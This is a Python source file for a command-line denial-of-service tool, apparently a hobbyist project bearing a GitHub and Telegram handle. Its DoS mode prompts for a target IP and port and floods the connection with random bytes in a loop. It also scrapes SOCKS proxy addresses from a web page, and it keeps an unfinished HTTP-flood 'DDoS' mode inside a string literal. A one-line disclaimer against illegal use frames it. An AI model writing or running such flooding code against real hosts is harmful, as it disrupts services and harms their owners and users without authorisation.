import re
import sys
import random
import time
import os
import socket
from colorama import Fore
import errno
import requests

title = Fore.CYAN + """


___________.__           ________          __   _______          __         ___    
\__    ___/|  |__   ____ \______ \   _____/  |_ \      \   _____/  |_   /\  \  \   
  |    |   |  |  \_/ __ \ |    |  \ /  _ \   __\/   |   \_/ __ \   __\  \/   \  \  
  |    |   |   Y  \  ___/ |    `   (  <_> )  | /    |    \  ___/|  |    /\    )  ) 
  |____|   |___|  /\___  >_______  /\____/|__| \____|__  /\___  >__|    )/   /  /  
                \/     \/        \/                    \/     \/            /__/  

        GitHub: @zClicker Telegram: @cvvdracoyz


                    """

#attack_pack = 0

def get_user_agents(filename: str):
    user_agents = []
    with open(filename, 'r') as f:
        content = f.readlines()
        for user_agent in content:
            user_agents.append(str(user_agent.strip()))
    return user_agents

def dos():
    os.system("clear")

    try:

        try:

            print(title)

            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            target = input("target IP (like 127.0.0.1 ecc...): ")
            port = int(input("target PORT: "))
            sleep = float(input("sleap TIME: "))

            s.connect((target, port))
            
            try:

                for i in range(1, 100*10000):

                    #r = requests.get(target + "10000000000")
                    #rp = requests.post(target + "10das2ijd")
                    #effective_request = r = requests.get(host + "some words")
                    s.send(random._urandom(10)*10000)
                    print(f"Sent {i} packets", end='\r')

                    time.sleep(sleep)

            except:
                delay_print("SERVER DOWN\n")
                sys.exit()

        except IOError as e:
            if e.errno == errno.EPIPE:
                pass

    except KeyboardInterrupt:
        print("Stopping the attack...")
        time.sleep(1)
        exit()

def delay_print(s):
    for c in s:
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(0.025)

def banner():
    print(title)
    delay_print("Don't use for illegal porpouse\n")

def get_proxies():
    URL = "http://www.live-socks.net/2018/11/27-11-18-socks-5-servers_57.html?m=1"

    req = requests.get(URL, timeout=10)
    
    content = req.text
    proxies = re.findall(r"(?:[\d]{1,3})\.(?:[\d]{1,3})\.(?:[\d]{1,3})\.(?:[\d]{1,3}):(?:[\d]{1,5})", content)
    
    return proxies

def ddos():
    os.system("clear")
    
    delay_print(Fore.RED + "Coming Soon...")
    
"""
    host = str(input("IP victim: "))
    pack_sent = 0

    try:

        try:

            while True:
                print(title)
                
                req = requests.get(host)
                pack_sent += 1
                print(f"Sent {pack_sent} Packets", end="\r")

        except:
            print("Server Down!")
            time.sleep(1)
            sys.exit()


    except KeyboardInterrupt:
        print("Stopping the attack")
        delay_print("Byeee")
        sys.exit()

"""
def main():
    banner()

    try:
    
        try:

    #print("Wrong Usage")
    #print("Use -h to show the help panel")
    
            if sys.argv[1] == "-h" or sys.argv[1] == "--help":
                os.system("clear")

                banner()

                print("Use -d or --dos for the DoS Pannel")

                print("Use -ds or --ddos for the DDoS Pannel")

            elif sys.argv[1] == "-d" or sys.argv[1] == "--dos":

                os.system("clear")

                banner()

                dos()

            elif sys.argv[1] == "-ds" or sys.argv[1] == "--ddos":
                os.system("clear")

                banner()

                ddos()

            else:
                print(Fore.RED + "Incorrect Usage")

        except:
            print("Somethings went wrong\nTry with -h")

    except KeyboardInterrupt:

        delay_print("Exiting...")
        sys.exit("Have a good day ;)")

if __name__ == "__main__":
    main()
